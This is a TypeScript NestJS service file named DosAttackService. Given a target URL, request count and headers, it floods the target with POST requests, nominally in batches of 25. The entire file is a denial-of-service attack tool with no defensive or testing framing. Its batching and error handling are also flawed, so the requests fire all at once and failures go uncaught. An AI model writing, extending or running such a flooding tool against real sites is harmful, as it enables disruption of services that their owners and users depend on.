import { Injectable } from '@nestjs/common';
import _ = require('lodash');
import {HttpService} from "@nestjs/axios";

@Injectable()
export class DosAttackService {
  constructor(private readonly http: HttpService) {
  }

  async makeAnAttack(url: string, amountOfRequests: number, requestHeaders: any) {
    const queries = this.makeQueries(url, amountOfRequests, requestHeaders);
    await this.runAllQueries(queries);
  }

  makeQueries(url: string, amount: number, headers: any): Promise<any>[] {
    const promises = [];
    for (let i = 0; i  < amount; i++) {
      try {
        promises.push(this.http.post(url, {}, {
          headers
        }).toPromise());
      } catch(e: any) {
        console.error(`Request crashed with message: ${e.message}`);
      }
    }
    return promises;
  }

  async runAllQueries(queries: any) {
    const batches = _.chunk(queries, 25);
    const results = [];
    while (batches.length) {
      const batch = batches.shift();
      try {
        const result = Promise.all(batch);
        results.push(result);
      } catch(e) {
        console.error(`Request crashed with message: ${e.message}`);
      }
    }
    return _.flatten(results);
  }
}